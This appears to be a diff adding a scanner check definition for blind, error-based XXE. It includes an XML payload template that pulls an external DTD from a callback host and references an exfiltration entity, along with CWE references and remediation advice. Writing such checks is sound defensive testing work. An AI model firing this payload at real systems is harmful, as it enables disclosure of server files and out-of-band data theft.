@@ -1,0 +1,22 @@
+{
+  "id": "m3-blind-xxe-error-based-dtd",
+  "bug_class": "blind_xxe",
+  "title": "Blind XXE (error-based out-of-band via external DTD)",
+  "severity": "High",
+  "applies_when": {
+    "always": true
+  },
+  "insertion_kinds": [
+    "body_whole"
+  ],
+  "oracle": {
+    "kind": "oob",
+    "payload_template": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://{callback}/err.dtd\"> %p;]><r>&exfil;</r>"
+  },
+  "references": [
+    "CWE-611",
+    "CAPEC-201"
+  ],
+  "remediation": "Disable external entity and DTD processing in every XML/SVG/SOAP/XSLT parser (secure-processing, no DOCTYPE, no external general+parameter entities, disable XInclude and the document()/xsl fetch). Prefer a hardened parser or a non-XML format. The inbound callback on parse proves the entity/reference was dereferenced.",
+  "payload_family": "xxe-error-based"
+}
